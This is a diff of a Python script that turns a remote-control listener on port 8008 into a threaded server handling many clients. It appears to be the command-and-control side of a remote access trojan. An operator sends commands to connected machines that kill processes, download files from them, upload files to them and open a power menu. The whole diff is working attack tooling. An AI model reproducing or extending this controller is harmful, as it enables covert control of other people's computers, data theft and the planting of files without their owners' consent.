@@ -1,13 +1,11 @@
 import socket, sys, struct, os, gc
+import threading
 
 HOST = "0.0.0.0"
 PORT = 8008
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-sock.bind((HOST, PORT))
-sock.listen(5)
-conn, addr = sock.accept()
+connections = [2]
+lock = threading.Lock()
 
 def bannerPW():
     print ("""
@@ -58,38 +56,63 @@ def sendFile(conn, filePath):
         file.close()
         print("File uploaded successfully")
 
-while True:
-    data = conn.recv(8096).decode('utf-8', errors='replace')
-    print(data)
+def handleClient(conn):
+   with conn:
+        print(f"New client connected: {conn.getpeername()}")
 
-    cmd = input('> ').upper()
-    conn.send(cmd.encode('utf-8', errors='replace'))
+        while True:
+            try:
+                data = conn.recv(8096).decode('utf-8', errors='replace')
+                print(data)
 
-    if cmd == "KPC":
-        pid = input("Enter PID of process to kill: ")
-        conn.send(pid.encode('utf-8', errors='replace'))
-    if cmd == "DF":
-        filePathDown = input("Enter file path you want to download from client: ")
-        conn.send(filePathDown.encode('utf-8', errors='replace'))
-        filePathSave = input("Enter the file path to save: ")
-        conn.send(filePathSave.encode('utf-8', errors='replace'))
-        receiveFile(conn, filePathSave)
-        del filePathDown
-        del filePathSave
-        gc.collect()
-    if cmd == "UF":
-        filePathUp = input("Enter file path you want to upload to client: ")
-        filePathSave = input("Enter the file path to save on the client: ")
-        conn.send(filePathSave.encode('utf-8', errors='replace'))
-        sendFile(conn, filePathUp)
-        del filePathSave
-        del filePathUp
-        gc.collect()
-    if cmd == "EXIT":
-        print("Connection closed!")
-        conn.close()
-        break
-    if cmd == "PW":
-        bannerPW()
-        buff = input("Enter a number to do something: ")
-        conn.send(buff.encode('utf-8', errors='replace'))
+                cmd = input('> ').upper()
+                conn.send(cmd.encode('utf-8', errors='replace'))
+
+                if cmd == "KPC":
+                    pid = input("Enter PID of process to kill: ")
+                    conn.send(pid.encode('utf-8', errors='replace'))
+                if cmd == "DF":
+                    filePathDown = input("Enter file path you want to download from client: ")
+                    conn.send(filePathDown.encode('utf-8', errors='replace'))
+                    filePathSave = input("Enter the file path to save: ")
+                    conn.send(filePathSave.encode('utf-8', errors='replace'))
+                    receiveFile(conn, filePathSave)
+                    del filePathDown
+                    del filePathSave
+                    gc.collect()
+                if cmd == "UF":
+                    filePathUp = input("Enter file path you want to upload to client: ")
+                    filePathSave = input("Enter the file path to save on the client: ")
+                    conn.send(filePathSave.encode('utf-8', errors='replace'))
+                    sendFile(conn, filePathUp)
+                    del filePathSave
+                    del filePathUp
+                    gc.collect()
+                if cmd == "EXIT":
+                    print("Connection closed!")
+                    conn.close()
+                    break
+                if cmd == "PW":
+                    bannerPW()
+                    buff = input("Enter a number to do something: ")
+                    conn.send(buff.encode('utf-8', errors='replace'))
+            except (ConnectionResetError, ConnectionAbortedError):
+                print(f"Client {conn.getpeername()} disconnected unexpectedly.")
+                break
+
+def main():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.bind((HOST, PORT))
+        sock.listen(5)
+        print(f"Server listening on {HOST}:{PORT}")
+
+        while True:
+            conn, addr = sock.accept()
+            with lock:
+                connections.append(conn)
+            client_thread = threading.Thread(target=handleClient, args=(conn,))
+            client_thread.start()
+
+if __name__ == "__main__":
+    main()
